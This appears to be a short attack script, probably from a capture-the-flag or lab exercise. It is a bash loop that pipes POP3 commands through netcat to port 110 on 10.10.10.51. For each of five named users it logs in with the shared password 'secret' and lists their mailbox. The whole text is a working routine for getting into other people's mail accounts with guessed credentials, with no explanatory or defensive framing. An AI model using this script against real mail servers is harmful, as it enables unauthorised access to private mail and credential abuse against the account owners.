for user in james thomas john mindy mailadmin
do
    (echo USER ${user}; sleep 2s; echo PASS secret; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.10.10.51 110;
done